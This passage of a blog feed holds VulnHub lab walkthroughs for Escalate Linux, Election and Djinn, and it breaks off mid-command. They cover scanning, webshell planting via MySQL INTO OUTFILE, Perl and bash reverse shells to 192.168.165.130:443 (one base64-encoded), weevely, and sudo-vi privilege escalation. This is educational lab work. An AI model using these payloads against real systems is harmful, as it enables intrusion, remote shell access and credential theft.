    <content type="html"><![CDATA[<h1 id="ğŸ–³-host-discover"><a href="#ğŸ–³-host-discover" class="headerlink" title="ğŸ–³ host discover"></a>ğŸ–³ host discover</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.165.0/24<br>Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                        <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                        <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.165.14  c6:3b:70:2b:33:1e      1      60  Unknown vendor                                                                                                       <br> 192.168.165.60  08:00:27:ea:fe:25      1      60  PCS Systemtechnik GmbH                                                                                               <br> 192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate       <br></code></pre></td></tr></table></figure><p>target was <em>192.168.165.60</em></p><h1 id="ğŸ‘-service-scan"><a href="#ğŸ‘-service-scan" class="headerlink" title="ğŸ‘ service scan"></a>ğŸ‘ service scan</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.165.60<br>Â·Â·Â·<br>PORT      STATE SERVICE     VERSION<br>80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>111/tcp   open  rpcbind     2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100003  3           2049/udp   nfs<br>|   100003  3           2049/udp6  nfs<br>|   100003  3,4         2049/tcp   nfs<br>|   100003  3,4         2049/tcp6  nfs<br>|   100005  1,2,3      39060/udp   mountd<br>|   100005  1,2,3      39568/udp6  mountd<br>|   100005  1,2,3      52275/tcp   mountd<br>|   100005  1,2,3      53503/tcp6  mountd<br>|   100021  1,3,4      33553/tcp6  nlockmgr<br>|   100021  1,3,4      39193/tcp   nlockmgr<br>|   100021  1,3,4      53493/udp   nlockmgr<br>|   100021  1,3,4      56884/udp6  nlockmgr<br>|   100227  3           2049/tcp   nfs_acl<br>|   100227  3           2049/tcp6  nfs_acl<br>|   100227  3           2049/udp   nfs_acl<br>|_  100227  3           2049/udp6  nfs_acl<br>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br>2049/tcp  open  nfs         3-4 (RPC <span class="hljs-comment">#100003)</span><br>35337/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>39193/tcp open  nlockmgr    1-4 (RPC <span class="hljs-comment">#100021)</span><br>52275/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>56035/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>MAC Address: 08:00:27:EA:FE:25 (Oracle VirtualBox virtual NIC)<br>Service Info: Host: LINUX<br>Â·Â·Â·<br></code></pre></td></tr></table></figure><h1 id="ğŸšªğŸš¶-get-shell"><a href="#ğŸšªğŸš¶-get-shell" class="headerlink" title="ğŸšªğŸš¶ get shell"></a>ğŸšªğŸš¶ get shell</h1><p>path brute</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.165.60 -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.165.60<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/shell.php            (Status: 200) [Size: 29]<br>Progress: 5163 / 5164 (99.98%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>find a webshell page,bound shell!<br>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;192.168.165.130&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;bash -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p>url encode-&gt;final payload(<code>https://www.urlencoder.org/</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.165.60/shell.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.165.130%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22bash%20-i%22%29%3B%7D%3B%27<br></code></pre></td></tr></table></figure><h1 id="ğŸ›¡ï¸-PE"><a href="#ğŸ›¡ï¸-PE" class="headerlink" title="ğŸ›¡ï¸ PE"></a>ğŸ›¡ï¸ PE</h1><h2 id="No-1-user3-shell-PE"><a href="#No-1-user3-shell-PE" class="headerlink" title="No.1 user3/shell PE"></a>No.1 user3/shell PE</h2><p>enum manucal,we find there was a shell binary in /home/user3<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f07c5999b7c4f19bbec3c.png"></p><h2 id="No-2-user5-PE"><a href="#No-2-user5-PE" class="headerlink" title="No.2 user5 PE"></a>No.2 user5 PE</h2><p>in /home/user5, there was a script binary file,after we excute command follow user5â€™s .bash_history,we could get all the users hash<br>and we could crack rootâ€™s passwd <code>root:12345</code><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/656d3b8bc96a87b6f775c.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e0e34d95cf637152c7f3.png"></p><h2 id="No-3-user8-PE"><a href="#No-3-user8-PE" class="headerlink" title="No.3 user8 PE"></a>No.3 user8 PE</h2><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0a9da82e8dc8a8e7b2f97.png"><br>from user8â€™s history, we find the mysql config file,and find the pass of mysql<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/00d61d11d02d289a4152a.png"><br>and we seletc the password of user:mysql<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/14a132ed04e3349dc9af6.png"><br>and we find the cred of all user<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e293f2154ea3e24f017c3.png"></p><h3 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h3><p>user2 could use user1â€™s command,but we dont have user1â€™s passwd,but we could deduce user1 have the same format passwd <code>user1@12345</code>, and it was after trying.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/edd6f037e82469ea6dc5a.png"></p><h3 id="user8"><a href="#user8" class="headerlink" title="user8"></a>user8</h3><p>user8 have sudo for vi, so get the root shell by vi(GTFOBins)<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1a471ad7301b909259593.png"></p><h1 id="ğŸ“–-recommend-article"><a href="#ğŸ“–-recommend-article" class="headerlink" title="ğŸ“– recommend article"></a>ğŸ“– recommend article</h1><p>cause my ability was limited and i was tired in the night,so i just find this way to PE. author say there was 12+ way of PE<br><a href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/51a2daeb41c21996e999c.png"></a><br><a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">escalate:1 download</a><br><a href="https://0xa1mn.medium.com/escalate-linux-vulnhub-walkthrough-1945a54d3c03">another walkthrough</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp election</title>
    <link href="/vulnhub-wp-election/"/>
    <url>/vulnhub-wp-election/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-host-discover"><a href="#ğŸ–³-host-discover" class="headerlink" title="ğŸ–³ host discover"></a>ğŸ–³ host discover</h1><p><em>sudo netdiscover -r 192.168.165.0/24</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                       <br>4 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 240                                                                                                        <br>_____________________________________________________________________________<br>  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br>-----------------------------------------------------------------------------<br>192.168.165.14  c6:3b:70:2b:33:1e      2     120  Unknown vendor                                                                                                       <br>192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                                                                                      <br>192.168.165.209 08:00:27:40:48:1a      1      60  PCS Systemtechnik GmbH<br></code></pre></td></tr></table></figure><p>target is <em>192.168.165.209</em></p><h1 id="ğŸ‘-service-scan"><a href="#ğŸ‘-service-scan" class="headerlink" title="ğŸ‘ service scan"></a>ğŸ‘ service scan</h1><p>nmap scan<br><em>sudo nmap -p- -sV -sC -Pn -oN nmap â€“min-rate 8000 192.168.165.209</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Â·Â·Â·<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)<br>|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)<br>|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>MAC Address: 08:00:27:40:48:1A (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>Â·Â·Â·<br></code></pre></td></tr></table></figure><h1 id="ğŸšªğŸš¶-get-shell"><a href="#ğŸšªğŸš¶-get-shell" class="headerlink" title="ğŸšªğŸš¶ get shell"></a>ğŸšªğŸš¶ get shell</h1><p>the apache was 2.4.49,but after trying payload,it seems dont have path traversa<br>and we find four path in robots.txt,finally election work,other was 404.<br>and we could brute the phpmyadmin path by dirb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.165.209<br>Â·Â·Â·<br>---- Scanning URL: http://192.168.165.209/ ----<br>+ http://192.168.165.209/index.html (CODE:200|SIZE:10918)                                                                                                               <br>==&gt; DIRECTORY: http://192.168.165.209/javascript/                                                                                                                       <br>+ http://192.168.165.209/phpinfo.php (CODE:200|SIZE:95563)                                                                                                              <br>==&gt; DIRECTORY: http://192.168.165.209/phpmyadmin/                                                                                                                       <br>+ http://192.168.165.209/robots.txt (CODE:200|SIZE:30)                                                                                                                  <br>+ http://192.168.165.209/server-status (CODE:403|SIZE:280)            <br>Â·Â·Â·<br></code></pre></td></tr></table></figure><p>and we could login in it by <em>root:toor</em><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/42ccc3de0bda161b19f7b.png"><br>cause the <code>secure_file_priv</code> was empty,and we are root,so we could write webshell into the web</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select <span class="hljs-string">&quot;&lt;?php system(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> into outfile <span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span><br></code></pre></td></tr></table></figure><p>and visit it in web<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aa963e63af61754a3188f.png"><br>then download the weevely shell into the web.(generate by weevely)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">weevely generate password back.php<br></code></pre></td></tr></table></figure><ul><li><code>password</code> was the pass when connect<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/704f22ff687f27d4594e7.png"><br>and connect it.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e4ab0b21e6784d79af005.png"><br>this shell was not enough stable and powerful,use</li></ul><p><em>bash -c â€˜bash -i &gt;&amp; /dev/tcp/192.168.165.130/443 0&gt;&amp;1â€™</em><br>bound reverse shell</p><h1 id="ğŸ›¡ï¸-PE"><a href="#ğŸ›¡ï¸-PE" class="headerlink" title="ğŸ›¡ï¸ PE"></a>ğŸ›¡ï¸ PE</h1><p>find suid binary file<br><em>find / -perm -u=s -type f 2&gt;/dev/null</em><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ca74366ab531de896d598.png"><br>the Serv-U was exploit<br><em>searchsploit Serv-U</em><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eb2eb9a604d1520a5c62a.png"><br>and get the exploit to the target machine(by wget).<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4f91ed35aab15aeb2298f.png"></p><h2 id="rabbit-hole"><a href="#rabbit-hole" class="headerlink" title="rabbit hole"></a>rabbit hole</h2><p>when i run script <em>linpeas.sh</em>, it show /var/spool/cron/ was important, and i found there was <em>/crontabs/root</em> file,and <em>www-data</em> was the owner,have the rw right,so i spend lots of time to try it.but it all fail, cause this directoryâ€™s cron must belong to this user,such as <em>/crontabs/root</em> must belong to user:<em>root</em>, and the directory have the <em>drwx-wxâ€“T</em> right, so only root could delete or change the file, even the fileâ€™s owner! so the <em>/crontabs/root</em> was fail to excute. cause <em>/crontabs/root</em>â€˜s owner was <em>www-data</em> not <em>root</em>, and the <em>www-data</em> cant change the owner of <em>/crontabs/root</em>.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bc29f805067dbf5b46b5d.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e4c0a6f9fdfe7c7135b8d.png"></p><h1 id="ğŸ“–-recommend-article"><a href="#ğŸ“–-recommend-article" class="headerlink" title="ğŸ“– recommend article"></a>ğŸ“– recommend article</h1><p><a href="https://www.vulnhub.com/entry/election-1,503/">election download</a><br><a href="https://medium.com/@chicxulub/election-1-vulnhub-walkthrough-341f7bfdf6bc">anotherâ€™s walkthrough</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp djinn</title>
    <link href="/vulnhub-wp-djinn/"/>
    <url>/vulnhub-wp-djinn/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-host-discover"><a href="#ğŸ–³-host-discover" class="headerlink" title="ğŸ–³ host discover"></a>ğŸ–³ host discover</h1><p><em>sudo netdiscoer -r 192.168.165.0/24</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                       <br>5 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 300                                                                                                        <br>_____________________________________________________________________________<br>  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br>-----------------------------------------------------------------------------<br>192.168.165.14  c6:3b:70:2b:33:1e      3     180  Unknown vendor                                                                                                       <br>192.168.165.109 08:00:27:43:80:7b      1      60  PCS Systemtechnik GmbH                                                                                               <br>192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate          <br></code></pre></td></tr></table></figure><p>target was <em>192.168.165.109</em></p><h1 id="ğŸ‘-service-scan"><a href="#ğŸ‘-service-scan" class="headerlink" title="ğŸ‘ service scan"></a>ğŸ‘ service scan</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.165.109<br>Â·Â·Â·<br>PORT     STATE    SERVICE VERSION<br>21/tcp   open     ftp     vsftpd 3.0.3<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt<br>| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt<br>|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:192.168.165.130<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 3<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>22/tcp   filtered ssh<br>1337/tcp open     waste?<br>| fingerprint-strings: <br>|   NULL: <br>|     ____ _____ _ <br>|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ <br>|     \x20/ _ \x20 | | | | <span class="hljs-string">&#x27;_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/</span><br><span class="hljs-string">|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|</span><br><span class="hljs-string">|     Let&#x27;</span>s see how good you are with simple maths<br>|     Answer my questions 1000 <span class="hljs-built_in">times</span> and I<span class="hljs-string">&#x27;ll give you your gift.</span><br><span class="hljs-string">|     &#x27;</span>-<span class="hljs-string">&#x27;, 8)</span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|     ____ _____ _ </span><br><span class="hljs-string">|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ </span><br><span class="hljs-string">|     \x20/ _ \x20 | | | | &#x27;</span>_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/<br>|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|<br>|     Let<span class="hljs-string">&#x27;s see how good you are with simple maths</span><br><span class="hljs-string">|     Answer my questions 1000 times and I&#x27;</span>ll give you your gift.<br>|_    <span class="hljs-string">&#x27;-&#x27;</span>, 1)<br>7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)<br>|_http-title: Lost <span class="hljs-keyword">in</span> space<br>|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+<br>Â·Â·Â·<br></code></pre></td></tr></table></figure><h1 id="ğŸšªğŸš¶-get-shell"><a href="#ğŸšªğŸš¶-get-shell" class="headerlink" title="ğŸšªğŸš¶ get shell"></a>ğŸšªğŸš¶ get shell</h1><p>port 21 have anonymous,and we get creds.txt,game.txt,message.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> message.txt          <br>@nitish81299 I am going on holidays <span class="hljs-keyword">for</span> few days, please take care of all the work. <br>And don<span class="hljs-string">&#x27;t mess up anything.</span><br><span class="hljs-string"></span><br><span class="hljs-string">cat game.txt </span><br><span class="hljs-string">oh and I forgot to tell you I&#x27;</span>ve setup a game <span class="hljs-keyword">for</span> you on port 1337. See <span class="hljs-keyword">if</span> you can reach to the <br>final level and get the prize.<br><br><span class="hljs-built_in">cat</span> creds.txt <br>nitu:81299<br></code></pre></td></tr></table></figure><p>we connect 1337 by nc,and find it was a game???</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 192.168.165.109 1337 <br>  ____                        _____ _                <br> / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ <br>| |  _ / _` | <span class="hljs-string">&#x27;_ ` _ \ / _ \   | | | | &#x27;</span>_ ` _ \ / _ \<br>| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/<br> \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|<br>                                                     <br><br>Let<span class="hljs-string">&#x27;s see how good you are with simple maths</span><br><span class="hljs-string">Answer my questions 1000 times and I&#x27;</span>ll give you your gift.<br>(9, <span class="hljs-string">&#x27;*&#x27;</span>, 8)<br>&gt; 72<br>(4, <span class="hljs-string">&#x27;-&#x27;</span>, 8)<br>&gt; -4<br>(1, <span class="hljs-string">&#x27;*&#x27;</span>, 7)<br>&gt; 7<br>(3, <span class="hljs-string">&#x27;/&#x27;</span>, 9)<br>&gt; 1/3<br>(4, <span class="hljs-string">&#x27;*&#x27;</span>, 4)<br>&gt; 16<br>(7, <span class="hljs-string">&#x27;*&#x27;</span>, 4)<br>&gt; 28<br>(9, <span class="hljs-string">&#x27;-&#x27;</span>, 1)<br>&gt; 8<br>(7, <span class="hljs-string">&#x27;-&#x27;</span>, 8)<br>&gt; -1<br>(9, <span class="hljs-string">&#x27;/&#x27;</span>, 3)<br>&gt; 3<br>(4, <span class="hljs-string">&#x27;-&#x27;</span>, 1)<br>&gt; <span class="hljs-built_in">exit</span><br>Stop acting like a hacker <span class="hljs-keyword">for</span> a damn minute!!<br></code></pre></td></tr></table></figure><p>it seems we need play 1000times,we try other port at first<br>we brute the path in 7331 web,and we find /wish and /genie<br>the /wish have a rce,so letâ€™s try.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.165.130/443 0&gt;&amp;1&#x27;</span> | <span class="hljs-built_in">base64</span><br>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2NS4xMzAvNDQzIDA+JjEK<br><br><span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2NS4xMzAvNDQzIDA+JjEK | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>after we receive the shell,letâ€™s enum,and we find user:nitishâ€™s cred</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@djinn:/home/nitish$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 32<br>drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 .<br>drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..<br>-rw------- 1 root   root    130 Nov 12  2019 .bash_history<br>-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc<br>drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache<br>drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev<br>drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg<br>-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt<br>www-data@djinn:/home/nitish$ <span class="hljs-built_in">ls</span> -la .dev<br><span class="hljs-built_in">ls</span> -la .dev<br>total 12<br>drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .<br>drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 ..<br>-rw-r--r-- 1 nitish nitish   24 Oct 21  2019 creds.txt<br>www-data@djinn:/home/nitish$ <span class="hljs-built_in">cat</span> 